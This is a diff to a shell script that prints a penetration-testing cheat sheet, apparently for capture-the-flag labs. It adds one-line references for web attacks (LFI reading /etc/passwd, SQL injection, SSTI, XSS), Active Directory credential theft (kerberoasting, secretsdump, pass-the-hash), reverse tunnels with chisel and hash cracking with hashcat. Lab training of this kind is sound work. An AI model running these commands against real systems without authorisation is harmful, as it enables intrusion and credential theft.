@@ -102,6 +102,40 @@ k "creds"    "grep -riE 'password|passwd' /etc /var/www 2>/dev/null"
 k "kernel"   "uname -a  ->  searchsploit"
 k "windows"  "winpeas.exe · whoami /priv · pay token"; }
 
+ref_web(){ h "WEB EXPLOITATION"
+k "dirs/vhost"  "fuzz <url> · vhost <domain>"
+k "LFI"         "../../../etc/passwd · php://filter · pay lfi"
+k "SQLi"        "' OR 1=1-- · sqlmap -u URL --batch · pay sqli"
+k "SSTI"        "{{7*7}} {{config}} · pay ssti"
+k "upload"      "php/phtml/.htaccess bypass · pay upload"
+k "XSS"         "<script>alert(1)</script> · pay xss"
+k "creds"       "admin:admin, default creds, view-source"; }
+
+ref_ad(){ h "ACTIVE DIRECTORY"
+k "enum"        "nxc smb \$TARGET -u u -p p --shares/--users"
+k "AS-REP"      "GetNPUsers.py dom/ -usersfile u -no-pass"
+k "kerberoast"  "GetUserSPNs.py dom/u:p -request"
+k "bloodhound"  "bloodhound-python -d dom -u u -p p -c all"
+k "pth"         "nxc smb \$TARGET -u u -H <hash>"
+k "dump"        "secretsdump.py dom/u:p@\$TARGET"
+k "shell"       "evil-winrm -i \$TARGET -u u -p p"; }
+
+ref_pivot(){ h "PIVOTING / PORT FORWARD"
+k "ssh local"   "ssh -L 8080:127.0.0.1:80 user@\$TARGET"
+k "ssh dynamic" "ssh -D 1080 user@\$TARGET  (+ proxychains)"
+k "chisel srv"  "chisel server -p 9001 --reverse"
+k "chisel cli"  "chisel client \$LHOST:9001 R:socks"
+k "ligolo"      "ligolo-proxy -selfcert  (agent -connect \$LHOST:11601)"; }
+
+ref_crack(){ h "HASH CRACKING (crack <file> auto-detects)"
+k "identify"    "hashid '<hash>'  ·  hash-identifier"
+k "md5/sha1"    "hashcat -m 0 / -m 100 h rockyou.txt"
+k "ntlm"        "hashcat -m 1000 h rockyou.txt"
+k "net-ntlmv2"  "hashcat -m 5600 h rockyou.txt"
+k "bcrypt"      "hashcat -m 3200 h rockyou.txt"
+k "linux sha512" "hashcat -m 1800 h rockyou.txt"
+k "files"       "crackzip <file>  (zip/rar/pdf/ssh)"; }
+
 learn(){ h "LEARNING & PRODUCTIVITY"
 k "brief"               "daily cyber news + actively-exploited CVEs"
 k "pay <query>"         "offline payloads/techniques (PayloadsAllTheThings+GTFOBins)"
@@ -119,7 +153,16 @@ k "vhost <domain> [ip]" "virtual-host / subdomain fuzz"
 k "spawn"               "print+copy the TTY-stabilize steps"
 k "enc <b64|hex|url|rot13> <t>" "encode  ·  dec = decode"
 k "steg <file>"         "forensics gauntlet (exif/strings/binwalk/steghide)"
-k "extract <file>"      "unpack any archive"; }
+k "extract <file>"      "unpack any archive"
+k "search <term>"       "searchsploit (Exploit-DB)"
+k "smb <ip>"            "quick SMB share enum"
+k "magic <text>"        "auto-decode (b64/hex/rot13/url/b32)"
+k "crackzip <file>"     "crack zip/rar/pdf/ssh-key (john+rockyou)"
+k "sshkey [name]"       "gen ssh key for authorized_keys"
+k "www [port]"          "serve CURRENT folder over http"
+k "qr <img>"            "decode a QR/barcode"
+k "genpass [n]"         "random password  ·  rocky <re> = grep rockyou"
+k "cve <id>"            "quick CVE lookup"; }
 
 tmuxc(){ h "TMUX  (prefix = Ctrl+b, press then release)"
 k "Alt + arrows"        "move between panes"
@@ -159,5 +202,9 @@ case "$1" in
   ports)   banner; ref_ports ;;
   transfer) banner; ref_transfer ;;
   privesc) banner; ref_privesc ;;
+  web)     banner; ref_web ;;
+  ad)      banner; ref_ad ;;
+  pivot)   banner; ref_pivot ;;
+  crack)   banner; ref_crack ;;
   *)       banner; desktop; htb; quick; tmuxc; shell; learn; echo ;;
 esac
